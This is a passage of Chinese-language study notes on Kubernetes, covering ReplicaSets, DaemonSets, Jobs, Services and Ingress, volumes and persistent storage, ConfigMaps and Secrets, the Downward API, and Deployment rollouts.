pod，而只会影响后续新创建出来的 pod；这样方法可以用来升级 pod，但它不是升级 pod 的最好方法； edit 命令会使用默认的编辑器来操作 yaml 文件，可以通过设置 KUBE_EDITOR 环境变量来改变默认编辑器 水平缩放 pod有两种方法可以实现水平缩放，一种是使用 kubectl scale 命令，一种是直接编辑修改 yaml 文件； 删除一个 ReplicationCotroller删除 ReplicationCotroller 时，默认会删除由其监管的 pod，但如果加上 cascade 选项后，就可以仅删除 rc 本身，而不删除 pod； 使用 ReplicaSet 而不是 ReplicationControllerReplicaSet 是新一代的 ReplicationController，用来取代 ReplicationController； 比较 ReplicationController 和 ReplicaSet它们二者基本上完全相同，区别在于 ReplicaSet 里面标签选择器的表达能力更强；例如可以支持：包含、不包含、等于等多种条件表达式； 定义 ReplicaSet 创建和检查 ReplicaSet 使用 ReplicaSet 的更富表达力的标签选择器ReplicaSet 的更富表达力的标签选择器主要由它的 matchExpressions 属性来体现，它由三部分组成，分别是键名、条件运算符、键值（可以是列表）； 条件运算符包括： In：标签值包含在列表中 NotIn：标签值不在列表中 Exists：存在指定的标签（值无所谓）； DoesNotExist：不存在指定的标签（值无所谓）； 使用 DaemonSet 在每个节点上运行一个 pod由 ReplicaSet 管理的 pod 是随机分布在节点上面的，有可能每个节点刚好一个 pod，也有可能不那么平均，有些多点，有些少点；如果想让每个节点刚好运行一个 pod，则需要用到 DaemonSet 来搞定； 一般来说，有这种特殊部署要求的 pod 主要是用来运行一些系统服务进程的； 使用 DaemonSet 在每个节点上运行一个 podDaemonSet 根据选择器选择出匹配的节点后，就会在每个节点上运行一个 pod； 如果节点挂了，则它不会有动作； 但如果添加一个新节点到集群中，则它会马上给这个新节点创建一个 pod； 如果节点上面的 pod 挂了，则它会重新在该节点上面创建一个 pod； 使用 DaemonSet 只在特定的节点上运行 podDaemonSet 通过 pod 模板中的 nodeSelector 来选择匹配的节点； 由于 DaemonSet 是使用标签选择器来匹配节点，因此让节点的标签被修改后不再匹配时，DaemonSet 会帮忙将该节点上面已经创建的 pod 删除掉； 运行执行单个任务的 podReplicationController、ReplicaSet、DaemonSet 创建出来的 pod 都是持续运行的，当需要创建一些只运行一次就退出的 pod 时，这个时候 Job 出场才能搞定了； 介绍 Job 资源Job 很适合去干一些临时任务，尤其是这些临时任务需要在每个节点上面跑一次，而且每次跑的时间比较长，有可能中途出现意外，需要重新再跑的时候；这时用 Job 的优势就体现出来了，因为它可以通过选择器批量在多个节点上面跑任务，然后会持续监控任务顺利完成才罢休，不然会自动重新运行意外退出的任务，直到它成功为止，这样是可以让人很省心的； 定义 Job 资源 Job 的 restartPolicy 只能是 onFailure 或者 Never，不能是通常默认的 Always； 在 Job 运行一个 podJob 管理的 pod 在运行完成后，会变成“已完成”的状态，但不会被删除，因为这样可以查阅日志，如果删除了就没有办法看到运行的日志了； 在 Job 中运行多个 pod 实例Job 可以运行一次创建一个 pod，也可以运行多次，创建多个 pod 实例，这些实例可以并行运行，也可以串行； 限制 Job pod 完成任务的时间有些 pod 有可能运行很久才能结束，但有时候万一卡住了则将永不结束；因此，可以通过设置运行时间的上限来解决这个问题；当超时后，就会 pod 终止，并将 Job 标记为失败； 通过设置 activeDeadlineSeconds 属性来实现； 安排 Job 定期运行或在将来运行一次如果有些任务需要定期重复执行，如果在某个特定的时间点执行，则此时通过通过创建 CronJob 来实现； 创建一个 CronJob 了解计划任务的运行方式设置 pod 的最迟开始时间，如果超过了指定的时间还没有开始运行，则 Job 会被标记为失败； 问题一：如果 CronJob 同时创建了两个任务怎么办？答：执行的任务需要是幂等的，即多次运行仍然会得到相同的结果； 问题二：如果 CronJob 遗漏没有创建任务怎么办？答：当下一个任务开始时，如果发现上一个任务错过了，则应该先完成前面一个任务的工作； 5. 服务：让客户端发现 pod 并与之通信由于 pod 的生命周期是短暂的，因此它的 IP 地址是动态变化的，所以需要有一种机制，能够稳定的连接到提供服务的 pod，这种机制就是服务；服务需要做两个事情，当 pod 就绪后，能够将请求路由给 pod 进行响应；当 pod 变动后，能够发现新 pod 的通信地址； 猜测它的实现机制是让 pod 被创建并进入就绪状态后，就向相关控制器进行报告，相当于在控制器那里做一个登记备案，之后控制器就可以将外部请求路由给它了； 介绍服务概念：服务很像一个有固定 IP 地址的负载均衡器，既能够被内部的 Pod 稳定的访问，也能够被外部稳定的访问，同时能够将外部请求路由给当前正在工作的 Pod； 创建服务与其他资源类似，服务同样是通过标签选择器，来判断当前服务应该路由匹配到哪些 Pod； 通过 kubectl expose 创建服务kubectl expose deployment hello-world –type&#x3D;LoadBalancer –name&#x3D;my-service 通过 YAML 文件创建服务kubectl create kubia-svc.yaml kubia-svc.yaml 检测新的服务kubectl get svc 默认情况下，服务的作用范围在集群内部，让 pod 之间可以通讯； 从内部集群测试服务 此处的双横杠是命令的间隔，以便匹配给 kubectl 的参数和远程要执行的命令 curl 配置服务上的会话亲和性由于负载均衡的存在，一般来说每次服务调用都会随机分配给不同的 pod 进行响应，但是可以通过设置 sessionAffinity 属性来指定倾向性的 pod IP；它会将来源某个特定 ClientIP 的请求都转发到某个特定的 Pod 上面； 同一个服务暴露多个端口 使用命名的端口 使用命名端口的好处是万一端口号改了，也不需要改动调用的地方； 服务发现当服务创建好了后，Kubernetes 会将服务的地址存起来，这样当后续有创建新的 Pod 时，它就会把服务的地址写入新 Pod 的环境变量中，这样新 Pod 就可以通过环境变量来访问服务了； 但是如果 Pod 早于服务之前创建的话，就没有办法使用写入环境变量的方式了； 通过环境变量发现服务 通过 DNS 发现服务当 Kubernetes 启动的时候，它其实会创建一个 Kube-dns 的 Pod，这个 Pod 的功能就是用来做 DNS 的工作的；所有服务都会在那里备案（即添加一个条目），以便其他 Pod 可以通过全限定域名（FQDN）查询到服务； Kubernetes 通过修改 Pod 中的 &#x2F;etc&#x2F;resolv.conf 文件， 强制 Pod 访问其创建的 内部 DNS 服务器（即名为 Kube-dns 的 Pod） ；但是 Pod 可以通过修改 spec 中的 dnsPolicy 属性来绕过它； 通过 FQDN 连接服务 backend-database 表示服务的名称 default 表示命名空间 svc.cluster.local 表示本地集群 虽然服务可以通过名称进行访问，但访问者仍然需要知道服务的端口号，除非服务使用了标准端口号； 如果访问者的 Pod 与提供服务的 Pod 在同一个命名空间和集群，则只需要服务名称就够了； 连接集群外部的服务介绍服务 endpoint直觉上服务和 pod 是直接连接的，但实际上之间隔着 endpoint 资源，服务直接对话的是 endpoint，之后才是 Pod； 手动配置服务的 endpoint服务是通过标签选择器来创建相应数量的 endpoint 资源的，因此，如果服务没有写标签选择器，则 Kubernets 就不会为服务创建 endpoint，但是我们可以通过手动创建的方式，为服务创建相应的 endpoint；服务和 endpoint 需要使用相应的名称，才能建立关联； 此时通过创建外部 IP 地址的 endpoint，就可以实现对外部服务的访问； 为外部服务创建别名 由于 ExternalName 已经提供了外部域名和端口，因此实际内部 Pod 在获得这些信息后，并不需要再走内部的 DNS 服务代理，而是可以直接访问公网的 DNS 服务器，完成对外部服务的访问； 因此 Kubernetes 都不需要为 ExternalName 类型的服务分配内部 IP 地址了； 将服务暴露给外部客户端暴露服务给外部有三种方法： NodePort LoadBalance Ingress 使用 NodePort 类型的服务NodePort 的机制是在所有的节点上预留一个相同的端口，当外部访问该端口时，就将请求转发到内部提供服务的资源（其实它也是一个 Pod）；这意味着不仅可以通过 ClusterIP 访问服务，也可以通过任意节点的公网 IP 访问服务； 虽然 NodePort 服务的好处是访问任意节点的 IP 和相应端口即可以访问服务，但其实这种方式并不好，因为万一节点刚好宕机了，则访问将被拒绝； 通过负载均衡器将服务暴露出来负载均衡器需要集群托管供应商支持才行；如果支持的话，当配置服务的类型为 LoadBalancer 时，Kubernetes 就会调用供应商提供的接口，创建一个负载均衡器服务； 负载均衡器的本质仍然是一个 NodePort 服务，唯一的区别是它由云基础架构的供应商支持并单独部署出来，如果打开防火墙的话，仍然可以像 NodePort 服务那样通过节点的公网 IP 来访问服务； 由于负载均衡器由云基础架构供应商单独提供，这意味着它是在集群外部、独立的；因此它需要将请求先路由到某个 node，再由该 node 将请求转给服务，之后服务再去寻找对应的 pod； 了解外部连接的特性了解并防止不必要的网络跳数正常来说，当外部请求到达节点时，节点会将连接请求转发到内部服务，然后由内部服务转发给任一 Pod，而这个 Pod 有可能在另外一个节点上面，导致出现不必要的跳转，因为本来在当前节点就有 Pod 可以提供服务了； 为了避免这个问题，可以通过设置 externalTrafficPolicy：local 来阻止额外的跳转；但是如果设置了这个属性为 local，则如果当前节点没有可用的 Pod 时，连接不会被转发，而是会被挂起，这就糟糕了；此时需要负载均衡器将连接转到至少有一个可用 pod 的节点上； 另外这个属性还有一个缺点是它会导致负载均衡器的效率变低，因为负载均衡本来是以 Pod 为单位进行均衡的，但是启用这个属性后，就变成以 Node 为单位了； 记住客户端 IP 是不记录的如果外部请求是先到节点，再到服务，则会存在一个问题，即请求中的数据包的源地址将会被节点做 SNAT 转换，这会导致最终提供服务的 Pod 无法看到请求的源地址；如果请求是先到服务，则不存在以上问题； 貌似使用负载均衡器将不可避免会遇到上述的问题？ 通过 Ingress 暴露服务LoadBalance 类型的服务的成本是很高的，因为每个服务都需要有自己的公网 IP；Ingress 即是为了解决这个问题而出现的； 由于 Ingress 是在 HTTP 层工作，因此它还可以提供 cookie 亲和性的功能； 不是每一种 Kubernetes 实现都默认开启支持 Ingress 的，需要提前确认一下功能开启可用； 创建 Ingress 资源使用描述文件创建： 通过 Ingress 访问服务它的工作原理跟 Nginx 几乎是一模一样的，唯一的区别是不需要在 Nginx 配置文件中说明如何转发请求了，而是在 Ingress 的描述文件中说明； 通过相同的 Ingress 暴露多个服务方式一 方式二 配置 Ingress 处理 TLS 传输在 Kubernetes 中创建 secrets 资源，然后在 Ingress 中引用它，就可以实现与客户端的加密传输了； 当增加证书选项后，如果 Ingress 资源已经创建，此时不需要删除重建，只需要再次运行 kubectl apply 命令，即可更新资源； 问：如何给证书添加 secret 以便 ingress 可以引用？ pod 就绪后发出信号pod 的就绪一般需要一点时间，如果 pod 启动后，立刻将请求接入进来，则第一个响应可能花费的时间比较久，因此需要有个机制能够声明自己是否进入就绪状态； 介绍就绪探针每个容器就绪的状态各有不同，因此就绪探针需要开发人员针对每个容器单独设置； 就绪探针的三种类型 Exec 探针：执行某个进程，状态由进程的退出状态码来确定； HTTP GET 探针：发送 HTTP GET 请求，就绪状态由响应码确定； TCP socket 探针：创建一个 TCP 连接，创建成功表示就绪 了解就绪探针的操作一般会设置一段等待的时间，之后再开启就绪探针的探测；如果容器未通过就绪状态的检查，容器不会被终止或者重新启动，但是存活探针就会；这是二者的主要区别； 向 pod 添加就绪探针可以 ReplicationController 描述文件中的模板添加关于探针的描述，示例如下： 了解就绪探针的实际作用 务必定义就绪探针：因为 Pod 的就绪是需要时间的，如果一创建就接入请求，会导致客户端收到错误的响应； 不要将停止 Pod 的操作逻辑放在就绪探针中，这超出了就绪探针的使用范围； 使用 headless 服务来发现独立的 pod在一些特殊的情况下，客户端可能连接到每个 Pod，而不是只连接到其中一个 Pod；此时客户端需要能够获取到所有 Pod 的 IP 地址列表，然后向它们发起请求；此时可以通过向 Kubernetes 中的 DNS 发起服务查询请求，正常情况下，这个请求返回的是服务 的 IP，但是如果配置服务的时候，其 ClusterIP 字段设置为 None，此该查询请求会获得所有的 Pod 的 IP； 创建 Headless 服务将服务的 ClusterIP 字段设置为 None 会使该服务变成一个 headless 服务； 通过 DNS 发现 podKubernetes 没有自带 nslookup 功能，但查询 DNS 需要使用这个功能，因此，可以通过创建一个带此功能的临时 pod 来实现查询（只需选择一个包含该功能的镜像就可以创建相应的 pod 了，使用 kubectl run 命令来创建，而不是使用描述文件）； 发现所有的 pod（包括未就绪的）headless 类型的服务，可以查询到所有 pod，但默认只限为已经准备就绪的，如果想让它返回的结果包含未就绪的，需要在服务的 metadata 中添加一个字段进行描述，示例如下： 貌似这是一个老方案了，最新的版本中据说要使用 publishNotReadyAddress 字段来实现相同的功能； 排除服务故障有时候服务不能正常工作，此时需要进行调试，以排除故障，找出原因；调试的如下： 确保是从集群内部发起的服务连接请求，而不是从集群外部； 不要通过 ping 来尝试连接集群内的服务，因为服务的 IP 是虚拟的； 如果有定义了就绪探针，确保它已经返回成功，因为未就绪的 pod 不会成为服务的组成部分； 可通过 kubectl get endpoints 来确认某个容器是否已经是服务的一部分了； 当尝试通过 FQDN 来访问服务时，可以试一下能够使用服务的集群 IP 来访问； 检查连接是否访问的是服务的公开端口，而不是其映射的目标端口； 尝试直接连接 pod IP，以确认 Pod 已经在正常工作； 如果 Pod IP 不可访问，需要检查一下 Pod 中的应用是否绑定并暴露相应的端口； 6. 卷：将磁盘挂载到容器存储卷的级别低于 pod，它被定义为 pod 的一部分；因此，它不能被单独创建或者删除；当 pod 被销毁时，存储卷也会被销毁；（好奇如何存储全局数据？） 介绍卷卷的应用示例发现跟之前了解的 docker 存储卷的用法并没有区别，卷需要在 pod 文件中定义，而且，还需要在 containers 部分将它们进行挂载； 存储卷的生命周期跟 pod 绑定，但是据说即使在 pod 和存储卷被销毁后，里面的内容仍然存在（好奇如何实现）； 可用的卷类型 emptyDir：用于存储临时数据的简单空目录； hostPath：用于将目录从工作节点的文件系统挂载到 pod 中； gitRepo：用于检出 Git 仓库的内容来初始化的卷；p nfs：挂载到 pod 中的 NFS 共享卷； 云存储：用于挂载云供应商提供的特定存储类型，例如 Google 的 gcePersistentDisk，亚马逊的 awsElastic BlockStore；微软的 azureDisk等； 网络存储：用于挂载其他类型的网络存储，例如 cinder, cephfs, iscsi, flocker, glusterfs 等等； 资源卷：用于将 Kubernetes 中的元数据资源公开给 pod 使用的特殊类型存储卷，例如 configMap, secret, downwardAPI 等； persistentVolumeClaim：使用预置或者动态配置的持久存储类型； 通过卷在容器之间共享数据使用 emptyDir 卷在 pod 的描述文件中使用存储卷 另外，可通过 medium:Memory 将存储卷的介质限定为内存； 使用 Git 仓库作为存储卷gitRepo 本质上也是一个 emptyDir 存储卷，差别在于初始化的时候，会检出代码进行数据填充；但是如果 Git 仓库中的代码出现更新时，存储卷并不会跟着更新，此时如果删除旧 pod，重新创建新 pod 时就会拉取最新的代码； 保持代码和仓库同步的办法，可以在 pod 中增加一个 git sync 镜像（这类型的镜像有很多），存储卷同时也挂载到基于该镜像所创建的容器（这类容器称为 sidecar 容器）中，然后配置 Github 的 Webhook 进行访问即可； gitRepo 卷有一个缺点，它不能拉取私有的仓库；如果需要拉取私有仓库，则只能使用 sidecar 容器了； 访问工作节点文件系统上的文件由于 pod 跟 Node 是解耦的，因此 pod 理论上不应该使用 node 文件系统中的数据，但存在一些例外情况；当 pod 需要根据 node 的配置文件，对 node 做一些管理工作时，就需要去读取 node 上的文件（这种类型的 pod 一般由 DaemonSet 来管理）； hostPath 卷hostPath 卷指向节点上的某个特定文件或者目录；同一个节点上的多个 pod，如果都有挂载相同路径的 hostPath 卷，则会实现文件的共享； hostPath 卷可以实现一定程度的持久性，即当一个 pod 被删除后，后续在同一个节点上建立的 pod 仍然可以使用上一个 pod 的遗留数据；但是这些数据无法在不同节点之间同步，所以它并不是一个适用于放置数据库文件的方案； 使用 hostPath 卷的 pod貌似 hostPath 卷挺适合用来访问节点上的日志文件或者 CA 证书； 使用持久化存储当数据需要在不同节点的 pod 之间共享时，此时需要使用某种类型的网络存储，pod 通过访问网络存储（NAS）进行数据的读取和写入； 使用 GCE 持久磁盘作为 pod 存储卷步骤 先创建 GCE 持久磁盘：将持久磁盘创建在相同区域的 Kubernetes 集群中； 创建一个使用持久磁盘卷的 pod； 通过底层持久化存储使用其他类型的卷方法大同小异，都是先准备好持久性的存储资源，然后在 pod 描述文件中进行配置以连接它们进行使用； 但是这种方法有很大的缺点，即开发人员需要了解这些持久性存储资源，并且描述文件和它们强耦合，如果换了一个集群环境，描述文件将不再可用，这不是一种最佳实践，有待改进； 从底层存储技术解耦 pod介绍持久卷和持久卷声明持久卷 persistent volume（PV）是一种资源，就像 service&#x2F;pod 一样，它由集群的硬件管理员通过声明来创建；之后开发人员通过持久卷（使用）声明 persistent volume claim (PVC) 来绑定它，然后再通过 pod 声明来来引用相应的持久卷声明； 在同一个时间点，持久卷只能被声明并创建一次，即在它没有被删除前，不能在集群中声明相同名称的另外一个持久卷，除非先把原来旧的删掉； 创建持久卷集群硬件管理员通过声明挂载网络存储来生成持久卷 注：持久卷是全局资源，即它不属于任何单独的命名空间，就像节点一样；但是持久卷的使用声明是归属于特定命名空间的； 通过创建持久卷声明来获取持久卷开发人员在 pod 中引用持久卷之前，需要先创建持久卷声明，绑定某个持久卷，之后才能在 pod 中进行引用该持久卷声明； 在 pod 中使用持久卷声明在创建了持久卷声明后，接下来可以在 pod 声明中引用该持久卷声明； 了解使用持久卷和持久卷声明的好处通过增加了两层抽象，让开发人员和硬件管理员之间的工作实现了解耦，并增加了代码的可移植性，无须更改代码即可在不同的集群之间进行部署； 硬件管理员负责写创建声明创建持久卷，开发人员负责写使用声明绑定和引用持久卷； 持久卷有多种读写模式，例如 RWO, ROX, RWX，它们限定的单位是工作节点 node，而不是 pod 回收持久卷当删除了持久卷声明后，如果之前绑定的持久卷的 reclaim policy 为 retain，则此时该持久卷仍然处于不可用的状态，因为里面存放着上一个 pod 的数据，为了确保数据安全，此时需要手工回收持久卷（即删除并重新创建持久卷资源）； reclaim polic 还有另外两个选项： recycle：删除卷中的内容，并可被绑定到新的声明； delete：删除底层存储； 并不是每一种云存储都同时全部三个选项的，不同的云存储的支持情况不同；持久卷的回收策略，在持久卷创建之后，仍然是可以变更的； 持久卷的动态卷配置集群管理员除了通过手工的方式来创建一个特定技术或平台的存储卷以外，还可以使用动态配置来自动化执行这个任务； Kubernetes 内置了主流云服务提供商的 provisioner 脚本，通过调用脚本，可以实现自动化的资源申请； 动态配置的工作原理是集群管理员声明一个或多个的存储类 storageClass，然后开发人员在引用的时候，在声明中指定需要使用的类即可； 通过 StorageClass 资源定义可用存储类型 在 provisioner 属性中指定了使用哪个云服务供应商的脚本创建存储资源； 请求持久卷声明中的存储类在集群管理员创建了 storageClass 资源后，接下开发人员就可以在 PVC 中进行引用； StorageClass 是通过名称进行引用的，这意味着 PVC 的描述文件是可以在不同的集群中移植的； 不指定存储类的动态配置Kubernetes 自带一个默认的存储类，当开发人员在 PVC 中没有显示指定要引用的存储类时，将会默认使用自带的存储类；因此，如果想要让 Kubernetes 将 PVC 绑定到预先创建的 PV 时，需要将 storangeClasName 设置为空字符串，不然它会调用默认的云服务资源置备脚本自动创建新的存储卷； 因此，设置持久化存储的最简单办法 是创建 PVC 资源就好，至于 PV 此时可以由默认的置备脚本自行创建； 7 ConfigMap 和 Secret: 配置应用程序配置容器内应用程序常见的传递配置参数的做法： 传递命令行参数：参数少的时候； 引用配置文件：参数多的时候，运行容器前将配置文件挂载到卷中； 设置环境变量 敏感配置数据应区别对待，在 Kubernetes 中一般使用 configMap 保存非敏感配置项，用 secret 保存敏感配置项； 向容器传递命令行参数在 Docker 中定义命令与参数 ENTRYPOINT 负责定义启动时要调用的命令； CMD 负责定义传递给 ENTRYPOINT 的参数； RUN 附加参数（会覆盖 CMD 的参数设置，如有）； 虽然也可以使用 CMD 将要执行的命令传递给容器，而不使用 ENTRYPOINT，但这样不太好，因为设置了 ENTRYPOINT 后，即使没有 CMD 选项，容器也依然能够正常运行；因此，CMD 最好只用来传递参数即可； 指令可以有两种格式，分别是： shell 格式：例如 node app.js，该格式将使得 node 进程在 shell 运行； exec 格式：例如 [“node”, “app.js”]，该格式将直接运行 node 进程，不在 shell 中运行； 在 Kubernetes 中覆盖命令和参数镜像中的 ENTRYPOINT 和 CMD 都可以被运行时的命令行参数 command 和 args 覆盖； 为容器设置环境变量在容器定义中指定环境变量 在环境变量值中引用其他环境变量 了解硬编码环境变量的不足之处环境变量如果硬编码在 pod 和容器定义中，意味着需要区别生产容器和非生产容器，这将增加很多管理负担；如果能够将配置参数从 pod 定义中解耦脱离出来的话，将使得 pod 本币的定义更加纯粹； 利用 ConfigMap 解耦配置ConfigMap 介绍为了解决前面遇到的配置项耦合问题，Kubernetes 提供了 ConfigMap 资源来单独管理配置项；它本质上只是简单的键值对映射，值可以是字面量，也可以是文件； ConfigMap 是一种资源，它并不是直接传递给容器，而是通过卷或者环境变量的形式，传递到容器中；因此， 容器中的应用仍然像传统方式一样读取环境变量或者文件来做出不同的行为，这样可以让应用保持对 Kubernetes 的无感知（最佳实践，有利于移植）； 创建 ConfigMap有四种方法创建 ConfigMap： 可以直接在命令行中写字面量； 通过描述文件来创建 .yaml 通过导入文件来创建 –from-file 通过导入文件夹来创建 给容器传递 ConfigMap条目作为环境变量 如果某个容器所引用的 ConfigMap 资源不存在时，该容器将无法正常创建，会处于挂起状态，需要一直等到 ConfigMap 可用以后，容器才会被创建；除非将 ConfigMap 的引用备注为 optional，则此时虽然没有 ConfigMap，容器也会正常启动； 使用 ConfigMap 的好处在于将所有的配置参数作为全局资源进行管理，而不是分散在各个单独的资源描述文件中； 一次性传递 ConfigMap 的所有条目作为环境变量 若 ConfigMap 中存在不合格的键名，在创建的时候将被忽略； 传递 ConfigMap 条目作为命令行参数ConfigMap 并不能直接传递命令行参数，但是可以曲线救国，即通过设置环境变量，然后在命令行参数中引用环境变量就可以了； 使用 ConfigMap 卷将条目暴露为文件存储卷有一种特殊的类型是 ConfigMap 卷，在创建了以文件作为条目的 ConfigMap 后，在声明存储卷时，可以引用该 ConfigMap，这样 ConfigMap 中的文件条目将被存储到卷中，然后我们可以在 Pod 的描述中引用该存储卷即可； 在描述文件中引用 另外还可以只暴露部分条目到卷中 默认情况下，挂载卷到容器中的某个文件夹时，该文件夹中原本的内容将全部被隐藏覆盖；但是可以通过 subpath 字段来避免覆盖原来的文件；此时 mountPath 的值是一个文件名，而不是文件夹，subPath 则是卷中的一个条目，而不是整个卷； 当设置 ConfigMap 作为存储卷的内容来源时，还可以同时设置这些内容的读写权限 更新应用配置且不重启应用程序使用环境变量或者命令行参数给容器传递配置信息的缺点当配置信息出现变更时，无法动态将变更后的数据传递给容器；但是如果使用 configMap 卷就可以，不过此时还是需要容器内的应用有监控文件变化并自动重新加载才行； 对于挂载到容器中的卷，如果卷中的文件发生了变化，它在容器中的内容也是实时变化的，但是容器中的应用程序并不一定会监控变化并重新加载；但是如果有重新加载的话，则变化将实时的体现出来； 卷中文件的更新并不是逐个文件进行的，Kubernetes 实际是先将卷的所有文件都复制到容器中的一个新文件夹，然后再更改链接指向这个新建的文件夹；这样就可以避免仅更新部分文件，还没有完成所有文件更新的情况下，容器中的应用程序已经开始加载文件了； 这意味着挂载的更新是以文件夹为单位的，因此，如果挂载的是单个文件，而该文件不会被更新； 虽然对于单个 pod 内部的容器，文件的更新是一次性完整的，但是对于不同 pod 引用相同的 configMap 的情况，这些 pod 之间并不是同步的，它们的更新有先有后； 仅在容器中的应用可以监控并主动重新加载更新后的文件时，挂载可以动态变化配置文件的 ConfigMap 才比较有意义；因为不然即使 ConfigMap 中的文件变化了，应用程序也不需要跟着变化； 使用 Secret 给容器传递敏感数据介绍 SecretSecret 被设计用来存储敏感信息，它的用法跟 ConfigMap 类似，区别在于它在写入节点时，不会被物理存储，只是仅存储在内存中，这样当 pod 删除时，也不会在物理介质中留下痕迹； 默认令牌 Secret 介绍为了让 pod 从内部可以访问 Kubernetes API，每个 pod 初始化创建时，都会写入一个默认的 secret 资源，它包含用来访问 API 的三个条目，分别是 ca.cert, token, namespace 等； 创建 Secret 对比 ConfigMap 与 SecretConfigMap 中的条目以纯文件存储，但是 Secret 的条目会被以 base64 编码后存储；这样导致读取的时候，需要进行解码；不过正因为使用了 base64 编码，这意味着 secret 可以支持二进制格式的条目内容； Secret 的大小有上限，最多只能是 1MB； 对于非二进制的数据，如果不想使用默认的 base64 编码，则可以在 secret 的描述文件中使用 stringData 属性来存放；但是在的展示时候看不出来，它仍然会以 base64 编码的形式展示在 data 字段中； 当 secret 卷被挂载到容器中后，条目的值会预先解码，并以原本的形式写入对应的文件，这样容器的应用程序在访问该值时，无须再做进一步的转换； 在 pod 中使用 Secret 将敏感数据暴露为环境变量的做法其实是有安全隐患的： 有些应用程序在启动或报错时，会打印环境变量到日志中； 应用程序在创建子程序时，会复制当前进程的环境变量；子进程可以访问到这些敏感信息； 当访问私有镜像仓库时，需要访问凭证进行登录，此时可以将访问凭证存放在 secret 中，然后在相关字段引用该 secret 即可；不过此时对凭证的引用是写在 pod 的定义文件中的，如果凭证被很多 pod 共用，则这显然不是一个好的作法，另外有一个 ServiceAcount 可以用来实现复用； 8. 从应用访问 pod 元数据以及其他资源通过 Downward API 传递元数据对于可以提前预知的信息，那么可以通过 ConfigMap 写入容器的环境变量，以便容器进行访问；但是对于容器生成之后才知道的信息，例如 pod 名称、IP 等，则这个方法就行不通了；此时可以使用 Downward API，它通过创建 DownwardAPI 卷，将 pod 的元数据作为环境变量或文件注入或挂载到容器中； 了解可用的元数据 pod 的名称 pod 的 IP pod 所在的命名空间 pod 运行节点的名称 pod 运行所归属的服务账户的名称 每个容器请求的 CPU 和内存的使用量 每个容器可以使用的 CPU 和内存的限制 pod 的标签 pod 的注解 服务账户是指 pod 访问 API 服务器时用来进行身份验证的账户； 通过环境变量暴露元数据 通过 downwardAPI 卷来传递元数据 卷中包含的文件由 items 属性来定义； 元数据被存储到了文件中，这些文件的访问权限可以由 downwardAPI 卷的 defaultMode 属性来设置； 相对于环境变量的方式，使用卷的好处是当 pod 创建后，如果某些元数据出现变更，例如标签或注解，则卷中文件的数据会实时更新，而环境变量就做不到这一点了； 由于卷是 pod 级别的资源，因此相对环境变量，它还有另外一个好处是可以让同一个 pod 上的多个容器共享彼此的元数据值； 使用 downwardAPI 来获取元数据的好处是简单方便，缺点是它只能获取部分数据（例如仅限于单个 pod），并不能获取所有数据，如果想要获取更多数据，就需要使用 Kubernetes API 的方式； 与 Kubernetes API 服务器交互探究 Kubernetes REST API运行 kubectl 时，本质上是通过 HTTP 来调用 Kubernetes 的 REST API 接口 url；因此，沿用相同的思路，我们也可以从容器内部调用这些 API 来实现与 Kubernetes 服务器的交互； 以下两个命令的效果相同 kubectl get job my-job -o json curl http://localhost:8001/apis/batch/v1/namespaces/default/jobs/my-job 从 pod 内部与 API 服务器进行交互从 pod 内部与 API 服务器进行交互需要确认三件事情： 找到 Kubernetes 服务器的 IP 地址和端口； 对服务器进行验证，确保是与真正的服务器交互，而不是冒充者； 通过服务器对客户端的验证，确保客户商具备相应的操作权限； pod 创建过程中自动注入的 secret 含有用来和 Kubernetes 进行通信的证书；并且还含有令牌 token，用来实现已授权的操作；同时还有一个 namespace 文件包含当前 pod 所在的命名空间名称； 通过 ambassador 容器简化与 API 服务器的交互ambassador 容器和应用程序的容器运行在同一个 pod 中，它的作用类似于一个中间代理；应用程序通过 HTTP 发送请求给它，再由它使用 HTTPS 和 API 服务器交互；ambassador 容器本质上是在其中运行了 kubectl proxy，就这么简单； 同一个 pod 中的多个容器使用相同的本地回环地址，因此可以通过 localhost 来访问其他容器中暴露的服务端口； 使用客户端库与 API 服务器交互除了使用原始的 HTTPS 请求外，还可以使用第三方库来实现交互，不同的语言都有相应的实现，可以在应用程序代码中引入这些库，来实现与 API 服务器的交互； 另外 Kubernetes 还自带了一个 swagger API 框架可以用来生成客户端库和文档；同时还提供了 swagger UI 界面可用来查看和访问 API；但它默认没有开启，需要在启动时通过选项设置为开启，之后就可以通过浏览器进行访问了； 9. Deployment：声明式地升级应用更新运行在 pod 内的应用程序删除旧版本 pod，创建新版本 pod更新 ReplicationController 中的模板信息（例如镜像版本）后，RC 控制器将会发现当前没有 pod 与模板相匹配，因此它会把旧版本的 pod 删除掉，之后创建新版本的 pod； 这种升级的方式非常简单易懂，但是它的缺点是在删除和新建之间，会出现短暂的服务不可用状态； 先创建新 pod 再删除旧版本 pod由于 pod 一般使用 service 对外暴露服务，因此可以先等所有的新版本 pod 都创建好了后，再修改 service 的标签选择器，让其绑定到新的 pod 上面即可； 使用 ReplicationController 实现自动的滚动升级kubectl rolling-update 命令可以用来执行滚动升级的操作；它会创建一个新的 replicationController ，然后由它来创建新版本的 pod； kubectl 执行滚动升级的过程中，除了创建新 RC 外，它还会给旧的 RC 和旧的 pod 添加标签（不会改动旧标签，以免影响原来的服务稳定性），通过新增的标签来区分新旧 pod，然后通过逐渐递减旧 RC 的副本数和递增新 RC 的副本数，来实现滚动升级的过程； kubectl rolling-update 并不是一种理想的滚动升级方式，原因如下： 它在更新过程中会去修改旧的资源； 它通过 kubectl 客户端发起更新的请求，在这一过程中有可能出现网络异常和中断，将导致整个更新过程失败； 使用 Deployment 声明式的升级应用滚动升级过程不可避免涉及到了两个 replicaSet，一个用来管理旧 pod，一个负责新 pod；因此，通过在 relicaSet 之上引入新的 Deployment 资源，就可以实现两个 replicaSet 的协调工作，让开发人员将预期结果写在 deployment 的描述文件中，之后实现的复杂性被隐藏； 创建 deploymentdeployment 并不直接创建 pod，它仍然通过 replicaSet 来管理和创建 pod；一个 deployment 可以对应多个 replicaSet，它通过给这些 replicaSet 加上模板的哈希值进行区分，同时也可以确保相同的模板会创建出相同的 pod； 升级 deploymentdeployment 的升级是非常简单的，它非常类似于 pod 的扩容或缩容，只需要更改模板中的镜像 tag，Kubernetes 就会自动进行收敛，达成预期的状态； deployment 的升级支持多种策略，默认使用 rollingUpdate 滚动升级，此外还支持 recreate 的一次性升级（即删除所有旧的，再创建所有新的，服务会短暂中断）； deployment 比 kubectl rolling-update 更好的原因在于升级过程是由上kubernetes 的控制器来完成，而不是客户端，这样就可以避免可能出现的网络中断问题； deployment 升级成功后，并不会删除旧的 replicaSet，因为它可以用来实现快速回滚； 回滚 deployment在升级的过程中，如果发现错误，此时可以使用 kubectl rollout undo 命令来实现回滚； 由于 deployment 